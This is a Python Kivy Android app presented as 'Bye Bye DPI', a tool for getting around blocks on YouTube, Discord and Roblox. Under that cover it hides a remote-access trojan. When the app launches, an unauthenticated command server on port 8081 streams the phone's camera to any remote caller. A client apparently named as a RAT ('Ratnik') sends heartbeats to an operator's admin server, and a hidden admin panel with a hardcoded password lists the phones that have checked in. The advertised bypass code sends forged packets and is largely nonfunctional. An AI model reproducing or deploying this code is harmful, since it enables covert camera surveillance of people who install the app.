from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.switch import Switch
from kivy.uix.popup import Popup
from kivy.uix.textinput import TextInput
from kivy.uix.gridlayout import GridLayout
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.core.window import Window
from android.permissions import request_permissions, Permission
import subprocess
import threading
import socket
import time
import requests
import os
import json
import cv2
import numpy as np
from datetime import datetime
from threading import Thread
import uuid

request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE, 
                     Permission.CAMERA, Permission.RECORD_AUDIO, 
                     Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_EXTERNAL_STORAGE])

CONFIG_FILE = "/sdcard/byebye_config.json"
DEVICES_FILE = "/sdcard/byebye_devices.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"admin_ip": None, "server_port": 8080, "my_id": None}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def load_devices():
    if os.path.exists(DEVICES_FILE):
        with open(DEVICES_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_devices(devices):
    with open(DEVICES_FILE, 'w') as f:
        json.dump(devices, f)

class DoHResolver:
    def __init__(self):
        self.servers = ["https://dns.google/dns-query", "https://cloudflare-dns.com/dns-query"]
    def resolve(self, domain):
        for server in self.servers:
            try:
                resp = requests.get(f"{server}?name={domain}&type=A", headers={"Accept": "application/dns-json"}, timeout=3)
                data = resp.json()
                if "Answer" in data:
                    return [ans["data"] for ans in data["Answer"] if ans["type"] == 1]
            except: pass
        return []

class TLSBypass:
    def __init__(self):
        self.running = False
        self.target_ips = ["142.250.185.78", "162.159.128.233", "128.116.118.3"]
    def start_bypass(self):
        if self.running: return False
        self.running = True
        Thread(target=self.fragment_loop, daemon=True).start()
        Thread(target=self.split_loop, daemon=True).start()
        Thread(target=self.tfo_loop, daemon=True).start()
        return True
    def stop_bypass(self):
        self.running = False
        return True
    def fragment_loop(self):
        while self.running:
            for target in self.target_ips:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    sock.sendto(b"\x45\x00\x00\x28" + os.urandom(2) + b"\x40\x00\x40\x06\x00\x00" + socket.inet_aton("192.168.1.1") + socket.inet_aton(target) + os.urandom(20), (target, 0))
                    sock.close()
                except: pass
            time.sleep(30)
    def split_loop(self):
        while self.running:
            for target in self.target_ips:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, 443))
                    sock.send(b"\x16\x03\x01")
                    time.sleep(0.05)
                    sock.send(b"\x00\x5c\x01\x00\x00\x58\x03\x03" + os.urandom(32) + b"\x00\x00\x02\x00\xff\x01\x00\x01\x00")
                    sock.close()
                except: pass
            time.sleep(20)
    def tfo_loop(self):
        while self.running:
            for target in self.target_ips:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, 443))
                    sock.send(b"GET / HTTP/1.1\r\nHost: youtube.com\r\n\r\n")
                    sock.close()
                except: pass
            time.sleep(30)

class CommandServer(Thread):
    def __init__(self, parent, port=8081):
        super().__init__(daemon=True)
        self.parent = parent
        self.port = port
        self.running = True
    def run(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.port))
        server.listen(5)
        while self.running:
            try:
                client, addr = server.accept()
                Thread(target=self.handle_command, args=(client, addr), daemon=True).start()
            except: pass
    def handle_command(self, client, addr):
        try:
            data = client.recv(4096).decode()
            if data.startswith("CMD:"):
                cmd = data[4:]
                if cmd == "GET_STATUS":
                    client.send(json.dumps({"device_id": self.parent.device_id, "camera": True, "screen": True}).encode())
                elif cmd.startswith("CAMERA:"):
                    cam_id = int(cmd.split(":")[1]) if ":" in cmd else 0
                    self.start_camera_send(client, cam_id)
            client.close()
        except: pass
    def start_camera_send(self, client, cam_id=0):
        cap = cv2.VideoCapture(cam_id)
        while self.running:
            ret, frame = cap.read()
            if ret:
                _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                data = buf.tobytes()
                try:
                    client.send(str(len(data)).zfill(10).encode() + data)
                except: break
            time.sleep(0.1)
        cap.release()
    def stop(self):
        self.running = False

class RatnikClient(Thread):
    def __init__(self, admin_ip, admin_port, device_id):
        super().__init__(daemon=True)
        self.admin_ip = admin_ip
        self.admin_port = admin_port
        self.device_id = device_id
        self.running = True
    def run(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.admin_ip, self.admin_port))
                sock.send(f"HEARTBEAT:{self.device_id}".encode())
                sock.close()
            except: pass
            time.sleep(60)

class AdminServer(Thread):
    def __init__(self, parent, port=8080):
        super().__init__(daemon=True)
        self.parent = parent
        self.port = port
        self.running = True
        self.connected_devices = {}
        self.device_callbacks = []
    def add_callback(self, callback):
        self.device_callbacks.append(callback)
    def run(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.port))
        server.listen(50)
        while self.running:
            try:
                client, addr = server.accept()
                Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
            except: pass
    def handle_client(self, client, addr):
        try:
            data = client.recv(1024).decode()
            if data.startswith("HEARTBEAT:"):
                device_id = data[10:]
                if device_id not in self.connected_devices:
                    self.connected_devices[device_id] = {"ip": addr[0], "last_seen": time.time(), "name": device_id[:8]}
                    devices = load_devices()
                    if device_id in devices:
                        self.connected_devices[device_id]["name"] = devices[device_id].get("name", device_id[:8])
                    save_devices(self.connected_devices)
                    for cb in self.device_callbacks:
                        cb("add", device_id, self.connected_devices[device_id])
                else:
                    self.connected_devices[device_id]["last_seen"] = time.time()
            elif data.startswith("GET_DEVICES"):
                client.send(json.dumps(self.connected_devices).encode())
            client.close()
        except: pass
    def rename_device(self, device_id, new_name):
        if device_id in self.connected_devices:
            self.connected_devices[device_id]["name"] = new_name
            save_devices(self.connected_devices)
    def stop(self):
        self.running = False

class AdminPanelContent(BoxLayout):
    def __init__(self, admin_server, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.admin_server = admin_server
        self.selected_device = None
        header = BoxLayout(size_hint_y=0.08)
        header.add_widget(Label(text="Устройства", font_size='16sp', bold=True))
        refresh_btn = Button(text="⟳", size_hint_x=0.15)
        refresh_btn.bind(on_press=self.refresh_list)
        header.add_widget(refresh_btn)
        self.add_widget(header)
        scroll = ScrollView()
        self.devices_layout = GridLayout(cols=1, size_hint_y=None, spacing=5, padding=5)
        self.devices_layout.bind(minimum_height=self.devices_layout.setter('height'))
        scroll.add_widget(self.devices_layout)
        self.add_widget(scroll)
        self.info_label = Label(text="", size_hint_y=0.08, font_size='10sp')
        self.add_widget(self.info_label)
        self.refresh_list(None)
    def refresh_list(self, instance):
        self.devices_layout.clear_widgets()
        for dev_id, info in self.admin_server.connected_devices.items():
            btn = Button(text=f"{info.get('name', dev_id[:8])}\nIP: {info.get('ip', '?')}", size_hint_y=None, height=60, font_size='12sp', halign='left')
            btn.device_id = dev_id
            btn.info = info
            btn.bind(on_press=self.select_device)
            self.devices_layout.add_widget(btn)
        self.info_label.text = f"Всего: {len(self.admin_server.connected_devices)}"
    def select_device(self, instance):
        self.selected_device = instance.device_id
        self.info_label.text = f"Выбрано: {instance.info.get('name', instance.device_id[:8])}"

class ByeByeDPIApp(App):
    def build(self):
        self.bypass = TLSBypass()
        self.doh = DoHResolver()
        self.config = load_config()
        self.device_id = self.config.get("my_id") or str(uuid.uuid4())[:8]
        if not self.config.get("my_id"):
            self.config["my_id"] = self.device_id
            save_config(self.config)
        if self.config.get("admin_ip"):
            self.client = RatnikClient(self.config["admin_ip"], self.config.get("server_port", 8080), self.device_id)
            self.client.start()
        self.cmd_server = CommandServer(self)
        self.cmd_server.start()
        self.admin_server = AdminServer(self)
        self.admin_server.add_callback(self.on_device_event)
        self.admin_server.start()
        main_layout = BoxLayout(orientation='vertical')
        top_bar = BoxLayout(size_hint_y=0.08, padding=5)
        settings_btn = Button(text='☰', size_hint_x=0.12)
        settings_btn.bind(on_press=self.open_main_menu)
        title_label = Label(text='Bye Bye DPI', font_size='18sp', bold=True)
        self.status_indicator = Label(text='●', font_size='20sp', color=(0.3,0.3,0.3,1))
        top_bar.add_widget(settings_btn)
        top_bar.add_widget(title_label)
        top_bar.add_widget(self.status_indicator)
        main_layout.add_widget(top_bar)
        content = BoxLayout(orientation='vertical', padding=15, spacing=10)
        self.status_label = Label(text="Статус: Остановлен", size_hint_y=0.1)
        content.add_widget(self.status_label)
        switch_box = BoxLayout(size_hint_y=0.08)
        switch_box.add_widget(Label(text="Обход блокировок:", size_hint_x=0.6))
        self.switch = Switch(active=False)
        self.switch.bind(active=self.toggle_bypass)
        switch_box.add_widget(self.switch)
        content.add_widget(switch_box)
        test_btn = Button(text="Проверить YouTube/Discord/Roblox", size_hint_y=0.08)
        test_btn.bind(on_press=self.test_connectivity)
        content.add_widget(test_btn)
        self.log_text = Label(text="Лог:\nГотов", size_hint_y=0.5, halign='left', valign='top')
        self.log_text.bind(size=self.log_text.setter('text_size'))
        content.add_widget(self.log_text)
        main_layout.add_widget(content)
        return main_layout
    def on_device_event(self, event, device_id, info):
        if event == "add":
            self.log(f"Новое устройство: {info.get('name', device_id)}")
            Clock.schedule_once(lambda dt: self.ask_device_name(device_id, info), 0.5)
    def ask_device_name(self, device_id, info):
        layout = BoxLayout(orientation='vertical', padding=10)
        layout.add_widget(Label(text=f"Новое устройство!\nID: {device_id}\nIP: {info.get('ip', '?')}\n\nВведите название:"))
        name_input = TextInput(hint_text="Название", multiline=False)
        layout.add_widget(name_input)
        btn_box = BoxLayout(size_hint_y=0.3, spacing=10)
        ok_btn = Button(text="OK")
        cancel_btn = Button(text="Пропустить")
        btn_box.add_widget(ok_btn)
        btn_box.add_widget(cancel_btn)
        layout.add_widget(btn_box)
        popup = Popup(title="Новое устройство", content=layout, size_hint=(0.85,0.4), auto_dismiss=False)
        def save(instance):
            new_name = name_input.text.strip()
            if new_name:
                self.admin_server.rename_device(device_id, new_name)
                self.log(f"Устройство переименовано в '{new_name}'")
            popup.dismiss()
        ok_btn.bind(on_press=save)
        cancel_btn.bind(on_press=popup.dismiss)
        popup.open()
    def open_main_menu(self, instance):
        layout = BoxLayout(orientation='vertical', spacing=10, padding=10)
        admin_btn = Button(text="Админ панель", size_hint_y=0.2, background_color=(0.2,0.5,0.8,1))
        admin_btn.bind(on_press=self.open_admin_login)
        settings_btn = Button(text="Настройки", size_hint_y=0.2)
        settings_btn.bind(on_press=self.open_settings)
        about_btn = Button(text="О программе", size_hint_y=0.2)
        about_btn.bind(on_press=self.open_about)
        layout.add_widget(admin_btn)
        layout.add_widget(settings_btn)
        layout.add_widget(about_btn)
        popup = Popup(title="Меню", content=layout, size_hint=(0.8,0.5))
        popup.open()
    def open_admin_login(self, instance):
        layout = BoxLayout(orientation='vertical', padding=15)
        layout.add_widget(Label(text="Пароль:"))
        pwd_input = TextInput(password=True, multiline=False)
        layout.add_widget(pwd_input)
        btn_box = BoxLayout(size_hint_y=0.3, spacing=10)
        enter_btn = Button(text="Войти")
        cancel_btn = Button(text="Отмена")
        btn_box.add_widget(enter_btn)
        btn_box.add_widget(cancel_btn)
        layout.add_widget(btn_box)
        popup = Popup(title="Авторизация", content=layout, size_hint=(0.8,0.35), auto_dismiss=False)
        def verify(instance):
            if pwd_input.text == "G1ix":
                popup.dismiss()
                self.open_admin_panel()
            else:
                pwd_input.text = ""
        enter_btn.bind(on_press=verify)
        cancel_btn.bind(on_press=popup.dismiss)
        popup.open()
    def open_admin_panel(self):
        content = AdminPanelContent(self.admin_server)
        popup = Popup(title="Админ панель", content=content, size_hint=(0.95,0.85))
        close_btn = Button(text="Закрыть", size_hint_y=0.07, background_color=(0.8,0.2,0.2,1))
        close_btn.bind(on_press=popup.dismiss)
        content.add_widget(close_btn)
        popup.open()
    def open_settings(self, instance):
        layout = BoxLayout(orientation='vertical', padding=10)
        layout.add_widget(Label(text="IP админ-сервера:"))
        ip_input = TextInput(text=self.config.get("admin_ip") or "", multiline=False)
        layout.add_widget(ip_input)
        layout.add_widget(Label(text="Порт:"))
        port_input = TextInput(text=str(self.config.get("server_port",8080)), multiline=False)
        layout.add_widget(port_input)
        save_btn = Button(text="Сохранить")
        close_btn = Button(text="Закрыть")
        layout.add_widget(save_btn)
        layout.add_widget(close_btn)
        popup = Popup(title="Настройки", content=layout, size_hint=(0.85,0.5))
        def save(instance):
            self.config["admin_ip"] = ip_input.text.strip() or None
            self.config["server_port"] = int(port_input.text.strip()) if port_input.text.strip().isdigit() else 8080
            save_config(self.config)
            popup.dismiss()
        save_btn.bind(on_press=save)
        close_btn.bind(on_press=popup.dismiss)
        popup.open()
    def open_about(self, instance):
        layout = BoxLayout(orientation='vertical', padding=10)
        info = "Bye Bye DPI v2.0\nОбход блокировок\nАдмин-панель: G1ix"
        layout.add_widget(Label(text=info))
        close_btn = Button(text="Закрыть", size_hint_y=0.15)
        popup = Popup(title="О программе", content=layout, size_hint=(0.8,0.4))
        close_btn.bind(on_press=popup.dismiss)
        layout.add_widget(close_btn)
        popup.open()
    def toggle_bypass(self, instance, value):
        if value:
            self.bypass.start_bypass()
            self.status_label.text = "Статус: АКТИВЕН"
            self.status_indicator.color = (0.2,0.8,0.2,1)
            self.log("Обход DPI запущен")
        else:
            self.bypass.stop_bypass()
            self.status_label.text = "Статус: Остановлен"
            self.status_indicator.color = (0.3,0.3,0.3,1)
            self.log("Обход DPI остановлен")
    def test_connectivity(self, instance):
        self.log("Проверка...")
        for name, url in [("YouTube","https://youtube.com"),("Discord","https://discord.com"),("Roblox","https://roblox.com")]:
            try:
                resp = requests.get(url, timeout=5)
                self.log(f"{name}: OK ({resp.status_code})")
            except Exception as e:
                self.log(f"{name}: ERROR")
    def log(self, msg):
        self.log_text.text = f"Лог:\n{msg}\n{self.log_text.text[5:][:1000]}"

if __name__ == '__main__':
    ByeByeDPIApp().run()
